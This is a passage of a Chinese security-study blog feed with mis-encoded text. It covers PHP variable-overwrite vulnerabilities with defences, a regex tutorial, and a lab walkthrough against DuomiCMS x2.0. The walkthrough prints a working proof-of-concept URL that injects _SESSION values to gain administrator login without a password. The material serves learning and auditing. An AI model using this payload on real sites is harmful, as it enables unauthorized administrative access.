å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚<strong>è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚</strong>é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚å…·ä½“å‡½æ•°ä»‹ç»ï¼š<a href="http://www.w3school.com.cn/php/func_array_extract.asp" title="å…·ä½“å‡½æ•°ä»‹ç»" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><p><strong>ç¤ºä¾‹ä¸€ï¼š</strong></p><p>å°†é”®å€¼ â€œCatâ€ã€â€Dogâ€ å’Œ â€œHorseâ€ èµ‹å€¼ç»™å˜é‡ $aã€$b å’Œ $cï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//è¿è¡Œç»“æœï¼š$a = Cat; $b = Dog; $c = Horse</span><br></pre></td></tr></table></figure></p><p>æˆåŠŸå°†å˜é‡aè¦†ç›–</p><p><strong>ç¤ºä¾‹äºŒï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=1;  </span><br><span class="line">extract($_GET);</span><br><span class="line">echo $id;</span><br><span class="line">?&gt;</span><br><span class="line">//æäº¤ï¼š?id=123</span><br><span class="line">//ç»“æœï¼š 123</span><br></pre></td></tr></table></figure><p>æˆåŠŸå°†å˜é‡idè¦†ç›–:</p><p><strong>extract()å‡½æ•°é˜²å¾¡:</strong></p><p><strong>åœ¨è°ƒç”¨extract()æ—¶ä½¿ç”¨EXTR_SKIPä¿è¯å·²æœ‰å˜é‡ä¸ä¼šè¢«è¦†ç›–  extract($_GET,EXTR_SKIP);</strong></p><h3 id="parse-str-å˜é‡è¦†ç›–"><a href="#parse-str-å˜é‡è¦†ç›–" class="headerlink" title="parse_str()å˜é‡è¦†ç›–"></a>parse_str()å˜é‡è¦†ç›–</h3><p>parse_str() å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œå¦‚æœæ²¡æœ‰array å‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚ç”¨æ³•å‚è€ƒï¼š<a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_parse_str.asp</a></p><p><strong>ç¤ºä¾‹ä¸€ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">parse_str(&quot;name=allblue&amp;age=18&quot;);</span><br><span class="line">echo $name  //è¾“å‡ºallblue</span><br><span class="line">echo $age   //è¾“å‡º18</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><strong>parse_str()å‡½æ•°é˜²å¾¡:</strong><br>åªèƒ½åœ¨ä¼ å‚å‰æ·»åŠ åˆ¤æ–­è¯­å¥ï¼Œåˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨ï¼›</p><p>tipsï¼šparse_str()ç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰mb_parse_str()ï¼Œç”¨æ³•åŸºæœ¬ä¸€è‡´ã€‚</p><h3 id="å¯¼è‡´å˜é‡è¦†ç›–é—®é¢˜"><a href="#å¯¼è‡´å˜é‡è¦†ç›–é—®é¢˜" class="headerlink" title="$$å¯¼è‡´å˜é‡è¦†ç›–é—®é¢˜"></a>$$å¯¼è‡´å˜é‡è¦†ç›–é—®é¢˜</h3><p>ä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å› æ­¤å°±äº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´ã€‚è¯·æ±‚?id=2 ä¼šå°†$idçš„å€¼è¦†ç›–ï¼Œ$id=2ã€‚</p><p><strong>ç¤ºä¾‹ä¸€ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=1;</span><br><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $request)&#123;</span><br><span class="line">foreach ($$_request as $_key=&gt;$_value)</span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line">echo $a;     //é€šè¿‡ä¼ å…¥å‚æ•°å®ç°å˜é‡è¦†ç›–</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="import-request-variableså˜é‡è¦†ç›–"><a href="#import-request-variableså˜é‡è¦†ç›–" class="headerlink" title="import_request_variableså˜é‡è¦†ç›–"></a>import_request_variableså˜é‡è¦†ç›–</h3><p>import_request_variables å‡½æ•°å¯ä»¥åœ¨ register_global = off æ—¶ï¼ŒæŠŠ GET/POST/Cookie å˜é‡å¯¼å…¥å…¨å±€ä½œç”¨åŸŸä¸­ã€‚</p><p>import_request_variables ( string $types , string $prefix )</p><p>å°† GETï¼POSTï¼Cookie å˜é‡å¯¼å…¥åˆ°å…¨å±€ä½œç”¨åŸŸä¸­, types å‚æ•°æŒ‡å®šéœ€è¦å¯¼å…¥çš„å˜é‡, Gä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIE.</p><p><strong>ç¤ºä¾‹ä¸€ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    </span><br><span class="line">import_request_variables(&apos;GP&apos;);   </span><br><span class="line">print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>æ­¤é¡µé¢å½“ä½¿ç”¨GETæˆ–POSTä¼ é€’$aå˜é‡æ—¶ï¼Œä¼šå°†åŸå˜é‡çš„å€¼è¦†ç›–ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šæ­¤å‡½æ•°åªèƒ½ç”¨åœ¨ PHP4.1 ~ PHP5.4ä¹‹é—´ã€‚<br>æ­¤å‡½æ•°æ˜¯éå¸¸å±é™©çš„å‡½æ•°ï¼Œåœ¨PHP5.5ä¹‹åå·²è¢«å®˜æ–¹åˆ é™¤ï¼Œå‡å¦‚ä½ ä»»ç„¶åœ¨ä½¿ç”¨ä½ç‰ˆæœ¬çš„PHPç¯å¢ƒï¼Œä¹Ÿå»ºè®®ä½ é¿å…ä½¿ç”¨æ­¤å‡½æ•°ã€‚</p><p>###å…¨å±€å˜é‡è¦†ç›–<br>register_globalsçš„æ„æ€å°±æ˜¯æ³¨å†Œä¸ºå…¨å±€å˜é‡ï¼Œæ‰€ä»¥å½“Onçš„æ—¶å€™ï¼Œä¼ é€’è¿‡æ¥çš„å€¼ä¼šè¢«ç›´æ¥çš„æ³¨å†Œä¸ºå…¨å±€å˜é‡ç›´æ¥ä½¿ç”¨ï¼Œè€ŒOffçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åˆ°ç‰¹å®šçš„æ•°ç»„é‡Œå»å¾—åˆ°å®ƒã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//?id=1</span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">echo &apos;$_GET[&quot;id&quot;] :&apos;.$_GET[&apos;id&apos;].&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;$id :&apos;.$id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>å½“register_globals=Offçš„æ—¶å€™ï¼Œä¸‹ä¸€ä¸ªç¨‹åºæ¥æ”¶çš„æ—¶å€™åº”è¯¥ç”¨$_GET[â€˜idâ€™]æ¥æ¥å—ä¼ é€’è¿‡æ¥çš„å€¼ï¼›</p><p>å½“register_globals=Onçš„æ—¶å€™ï¼Œä¸‹ä¸€ä¸ªç¨‹åºå¯ä»¥ç›´æ¥ä½¿ç”¨$idæ¥æ¥å—å€¼,ä¹Ÿå¯ä»¥ç”¨$_GET[â€˜idâ€™]æ¥æ¥å—ä¼ é€’è¿‡æ¥çš„å€¼ã€‚</p><p>tipsï¼šå¦‚æœä¸Šé¢çš„ä»£ç ä¸­ï¼Œå·²ç»å¯¹å˜é‡$idèµ‹äº†åˆå§‹å€¼ï¼Œæ¯”å¦‚$id=0ï¼Œé‚£ä¹ˆå³ä½¿åœ¨URLä¸­æœ‰/test.php?id=1ï¼Œä¹Ÿä¸ä¼šå°†å˜é‡è¦†ç›–ï¼Œidå€¼ä¸º0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">if (ini_get(&apos;register_globals&apos;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);  </span><br><span class="line">print $a.&quot;&lt;br/&gt;&quot;;  </span><br><span class="line">print $_GET[b];  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åœ¨register_globals=ONæ—¶,</p><p>æäº¤/test.php?a=1&amp;b=2 , å˜é‡$aæœªåˆå§‹åŒ–,$_GET[b]=2</p><p>æäº¤/test.php??GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2</p><p>tips:ã€€ä» PHP Â» 4.2.0 ç‰ˆå¼€å§‹é…ç½®æ–‡ä»¶ä¸­ PHP æŒ‡ä»¤ register_globals çš„é»˜è®¤å€¼ä» on æ”¹ä¸º off äº†,è‡ª PHP 5.3.0 èµ·åºŸå¼ƒå¹¶å°†è‡ª PHP 5.4.0 èµ·ç§»é™¤</p><h2 id="é¶åœºå®æˆ˜"><a href="#é¶åœºå®æˆ˜" class="headerlink" title="é¶åœºå®æˆ˜"></a>é¶åœºå®æˆ˜</h2><p>é¶åœºç¯å¢ƒï¼šDuomicmsx2.0ï¼›<br>å®¡è®¡å·¥å…·ï¼šseayæºç å®¡è®¡ç³»ç»Ÿï¼›<br>å› ä¸ºæˆ‘ä»¬åšçš„æ˜¯å˜é‡è¦†ç›–çš„é¢˜ç›®ï¼Œæ‰€æœ‰æˆ‘ä»¬å…ˆåœ¨seayæºç å®¡è®¡ç³»ç»ŸåŠ ä¸Šä¸€æ¡åŒ¹é…$$çš„æ­£åˆ™åŒ¹é…è§„åˆ™:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([^\$&quot;]|$)\$\&#123;?\$</span><br></pre></td></tr></table></figure></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd18kavzj31970nqwja.jpg" alt></p><p>é€šè¿‡å®¡è®¡å·¥å…·çš„è‡ªåŠ¨å®¡è®¡åŠŸèƒ½æ¥å®¡è®¡å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1kgorfj31hc0smtlz.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1y1tssj31az0myajn.jpg" alt><br>æœ€åå¯»æ‰¾ï¼Œå‘ç°äº†foreachå’Œ$$ç»“åˆçš„å˜é‡è¦†ç›–æ¼æ´</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd29fa65j319j0pyaga.jpg" alt></p><p>æ‰¾åˆ°äº†æ–‡ä»¶è¦†ç›–ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¯ä»¥è°ƒç”¨è¦†ç›–çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å…ˆæœç´¢åŒ…å«commond.phpçš„æ–‡ä»¶ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åœ¨å…¶å…³è”çš„æ–‡ä»¶ä¸­æ‰¾åˆ°å¯åˆ©ç”¨ä»£ç </p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2k0sthj31ap0qwwl5.jpg" alt><br>æœ€åæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªåŒ…å«äº†common.phpå’Œcheck.admin.phpçš„æ–‡ä»¶login.php</p><p>æˆ‘ä»¬å‘ç°check.admin.phpæ˜¯é€šè¿‡è·å–ç”¨æˆ·ç™»å½•æ—¶çš„idæ¥åˆ¤æ–­ç”¨æˆ·çš„æƒé™ï¼Œæ˜¯ä¸æ˜¯ç®¡ç†å‘˜<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2vgj7aj31gw0sewo8.jpg" alt></p><p>è€Œåœ¨admin.manager.phpæœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œç›´æ¥æ ¹æ®åˆ¤æ–­ä¼ è¿›æ¥çš„$groupidæ¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd34m68bj31hc0smqb6.jpg" alt></p><p>å¦‚æœä¼ è¿›æ¥çš„sessionå€¼ä¸º1ï¼Œé‚£ä¹ˆå°±æ˜¯ç®¡ç†å‘˜çš„æƒé™</p><p>é€šè¿‡æ„é€ POCä½¿å¾—duomi_group_id=1,å°±å¯ä»¥ç™»å½•ç³»ç»Ÿç®¡ç†å‘˜ï¼ŒPOCå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿›å»åå°ç™»å½•ç•Œé¢<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3da67rj31hc0pv40b.jpg" alt><br>åå°æ²¡æœ‰ç®¡è·¯å‘˜å¯†ç ç™»å½•ä¸ä¸Š<br>æ’å…¥æˆ‘ä»¬æ„é€ çš„POCï¼š<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3nw2muj31hb0r80u8.jpg" alt><br>æ’å…¥æˆåŠŸ<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3vn3gej31hc0pm76u.jpg" alt><br>è¿›å…¥åå°é¡µé¢ï¼Œå‘ç°æ²¡å¯†ç ï¼Œè‡ªåŠ¨æˆåŠŸç™»å½•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ­£åˆ™è¡¨è¾¾å¼</title>
      <link href="/2019/12/07/zhengzebiaodashi/"/>
      <url>/2019/12/07/zhengzebiaodashi/</url>
      
        <content type="html"><![CDATA[<p>æ­£åˆ™è¡¨è¾¾å¼ï¼ˆç±»ä¼¼æŸ¥æ‰¾æ–‡ä»¶ï¼‰(Regular Expression)æ˜¯ä¸€ç§æ–‡æœ¬æ¨¡å¼ï¼ŒåŒ…æ‹¬æ™®é€šå­—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œa åˆ° z ä¹‹é—´çš„å­—æ¯ï¼‰å’Œç‰¹æ®Šå­—ç¬¦ï¼ˆç§°ä¸ºâ€å…ƒå­—ç¬¦â€ï¼‰<br>æ­£åˆ™è¡¨è¾¾å¼(regular expression)æè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰ï¼Œå¯ä»¥<code>ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ã€å°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ªä¸²ä¸­å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶çš„å­ä¸²ç­‰</code>ã€‚</p><h2 id="æ­£åˆ™å‡½æ•°"><a href="#æ­£åˆ™å‡½æ•°" class="headerlink" title="æ­£åˆ™å‡½æ•°"></a>æ­£åˆ™å‡½æ•°</h2><ul><li><strong>preg_match ( string $pattern , string $subject ,  [array &amp;$matches] )</strong></li></ul><p>patternï¼šè¦æœç´¢çš„æ¨¡å¼ï¼Œå­—ç¬¦ä¸²ç±»å‹ï¼Œæ­£åˆ™è¡¨è¾¾å¼ ã€‚</p><p>subjectï¼šè¾“å…¥å­—ç¬¦ä¸²ã€‚ </p><p>matchesï¼šå¯é€‰ï¼Œå­˜å‚¨åŒ¹é…ç»“æœçš„æ•°ç»„ã€‚</p><p>ä½œç”¨æ˜¯ï¼šæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒæˆåŠŸè¿”å› 1 ï¼Œå¦åˆ™è¿”å› 0</p><ul><li><p><strong>preg_replace<br>(æ­£åˆ™ï¼Œæ›¿æ¢çš„å­—ç¬¦ä¸²ï¼ŒåŒ¹é…çš„å­—ç¬¦ä¸²ï¼‰</strong><br>å°†æ‰€æœ‰çš„åŒ¹é…æ­£åˆ™çš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼›</p><p><code>é€šå¸¸å¯ä»¥ç”¨æ¥è¿‡æ»¤æ•æ„Ÿå­—ç¬¦</code></p><ul><li><strong>preg_match_grep()</strong><br>åŒ¹é…ä¸€ä¸ªåŒ¹é…æ­£åˆ™çš„å­å­—ç¬¦æ•°ç»„ï¼ŒåŒ…å«åŒ¹é…çš„å­—ç¬¦ä¸²</li></ul></li></ul><ul><li><strong>preg_match_all(æ­£åˆ™ï¼ŒåŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œè¾“å‡ºçš„äºŒç»´æ•°ç»„</strong><h1 id="é™å®šç¬¦"><a href="#é™å®šç¬¦" class="headerlink" title="é™å®šç¬¦"></a>é™å®šç¬¦</h1></li></ul><hr><p>é™å®šç¬¦ç”¨æ¥æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç»™å®šç»„ä»¶å¿…é¡»è¦å‡ºç°å¤šå°‘æ¬¡æ‰èƒ½æ»¡è¶³åŒ¹é…ã€‚æœ‰ * æˆ– + æˆ– ? æˆ– {n} æˆ– {n,} æˆ– {n,m} å…±6ç§ã€‚<br>æ­£åˆ™è¡¨è¾¾å¼çš„é™å®šç¬¦æœ‰ï¼š</p><p>æ­£åˆ™è¡¨è¾¾å¼çš„é™å®šç¬¦æœ‰ï¼š</p><h3 id="å­—ç¬¦æè¿°"><a href="#å­—ç¬¦æè¿°" class="headerlink" title="å­—ç¬¦æè¿°:"></a>å­—ç¬¦æè¿°:</h3><p> *åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo<em> èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚</em> ç­‰ä»·äº{0,}ã€‚</p><p> + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äº {1,}ã€‚</p><p>?    åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€do(es)?â€ å¯ä»¥åŒ¹é… â€œdoâ€ ã€ â€œdoesâ€ ä¸­çš„ â€œdoesâ€ ã€ â€œdoxyâ€ ä¸­çš„ â€œdoâ€ ã€‚? ç­‰ä»·äº {0,1}ã€‚</p><p>{n}    n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚</p><p>{n,}    n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚</p><p>{n,m}    m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</p><h1 id="æ€»ç»“å…ƒå­—ç¬¦ï¼š"><a href="#æ€»ç»“å…ƒå­—ç¬¦ï¼š" class="headerlink" title="æ€»ç»“å…ƒå­—ç¬¦ï¼š"></a>æ€»ç»“å…ƒå­—ç¬¦ï¼š</h1><hr><p>\<br>å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ª å‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™nâ€™ åŒ¹é…å­—ç¬¦ â€œnâ€ã€‚â€™\nâ€™ åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\â€˜ åŒ¹é… â€œ\â€ è€Œ â€œ(â€œ åˆ™åŒ¹é… â€œ(â€œã€‚</p><p>^<br>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚</p><p>$<br>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚</p><p>*<br>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚</p><p>+<br>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚<br>?<br>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚</p><p>{n}<br>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚</p><p>{n,}<br>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚</p><p>{n,m}<br>m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</p><p>\d<br>åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚</p><p>\D<br>åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚</p><p>\d<br>åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚</p><p>\D<br>åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚</p><p>\f<br>åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚</p><p>\n<br>åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚</p><p>\r<br>åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚</p><p>\s<br>åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚</p><p>\S<br>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚</p><p>\w<br>åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚</p><p>\W<br>åŒ¹é…éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚</p><hr><h3 id="è®°å¾—åœ¨phpä¸­ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç”¨-åˆ†ç•Œï¼"><a href="#è®°å¾—åœ¨phpä¸­ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç”¨-åˆ†ç•Œï¼" class="headerlink" title="è®°å¾—åœ¨phpä¸­ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç”¨/åˆ†ç•Œï¼"></a>è®°å¾—åœ¨phpä¸­ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç”¨/åˆ†ç•Œï¼</h3>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥ï¼šæ˜¾é”™æ³¨å…¥</title>
      <link href="/2019/12/07/zhengze/"/>
      <url>/2019/12/07/zhengze/</url>
      
